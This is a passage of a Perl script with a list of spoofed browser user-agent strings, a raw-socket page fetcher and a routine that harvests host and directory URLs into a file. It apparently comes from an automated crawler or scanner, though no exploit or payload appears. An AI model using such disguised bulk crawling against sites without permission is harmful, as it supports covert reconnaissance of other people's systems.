    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
    "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
    "Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
    "Mozilla/3.0 (OS/2; U)",
    "Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
    "Mozilla/4.61 (Macintosh; I; PPC)",
    "Mozilla/4.61 [en] (OS/2; U)",
    "Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
    "Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}

sub end() {
    $string = $_[0];
    $string .= "/";
    $string =~ s/\/\//\//;
    while ( $string =~ /\/\// ) {
 $string =~ s/\/\//\//;
    }
    return ($string);
}

sub query($) {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host  = $url;
    my $query = $url;
    my $page  = "";
    $host  =~ s/href=\"?http:\/\///;
    $host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ( $query eq "" ) { $query = "/"; }
    eval {
 my $sock = IO::Socket::INET->new(
     PeerAddr => "$host",
     PeerPort => "80",
     Proto    => "tcp"
 ) or return;
 print $sock
"GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
 my @r = <$sock>;
 $page = "@r";
 close($sock);
    };
    return $page;
}

sub get_link() {
    my $file_print = $_[1];
    my $link= $_[0];
    my $host= $_[0];
    my $host_dir   = $_[0];
    my @links;
    $host_dir =~ s/(.*)\/[^\/]*$/\1/;
    $host     =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host_dir = &end($host_dir);
    $host     = &end($host);
    $link     = &end($host);
    push( @links, $link, $host, $host_dir );
    open( $file, '>>', $file_print );
    print $file "$link\n$host_dir\n$host\n";
    close($file);
    return @links;
}



sub unici {
    my @unici = ();
    my %visti = ();
    foreach my $elemento (@_) {
 $elemento =~ s/\/+/\//g;
 next if $visti{$elemento}++;
 push @unici, $elemento;
    }
    return @unici;
}
}
}
